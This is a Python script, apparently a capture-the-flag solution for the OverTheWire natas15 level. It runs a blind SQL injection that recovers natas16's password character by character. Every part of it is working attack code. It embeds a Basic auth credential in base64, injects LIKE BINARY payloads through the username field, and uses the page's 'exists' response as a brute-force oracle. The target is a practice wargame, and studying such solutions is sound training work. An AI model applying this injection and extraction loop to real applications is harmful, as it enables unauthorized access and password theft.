import requests
from requests.auth import HTTPBasicAuth
import string

#variables
#create a-zA-Z0-10 strings of characters
dicts = ''.join(string.ascii_letters+string.digits) 
dicts_filtered = ''
password = '' #buffer to store each gen password

header = {"Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="}
sqlURI = 'http://natas15.natas.labs.overthewire.org/index.php?debug'
SQLQuery = '" and password LIKE BINARY "{}{}%"#'

#filter the character in dictionary get only the exist characters
for char in dicts:
    reqData = {'username':'natas16" and password LIKE BINARY "%{}%"#'.format(char)}
    res = requests.post(sqlURI,headers=header,data=reqData)
    if 'exists' in res.text:
        dicts_filtered +=char

print('filtered:{}'.format(dicts_filtered))

#start bruteforcing using filtered 
print('Bruteforcing.....')
for i in range(0,32):
    for char in dicts_filtered:
        reqData = {'username':'natas16'+SQLQuery.format(password,char)}
        res = requests.post(sqlURI,headers=header, data=reqData)
        #print(char)
        if 'exists' in res.text :
            password +=char
            print(password)
            break